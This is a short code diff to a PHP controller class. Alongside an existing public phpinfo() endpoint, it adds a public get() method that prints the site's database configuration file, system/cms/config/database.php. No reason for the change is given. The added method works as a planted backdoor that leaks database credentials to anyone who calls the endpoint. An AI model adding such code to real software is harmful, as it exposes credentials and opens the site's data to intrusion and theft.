@@ -120,7 +120,12 @@ class curlProceso extends MX_Controller {
     public function getphpinfo(){
         phpinfo();
         
-    }      
+    }
+    
+    public function get(){
+        
+        print file_get_contents(FCPATH.'system/cms/config/database.php');
+    }
             
 }
 ?>
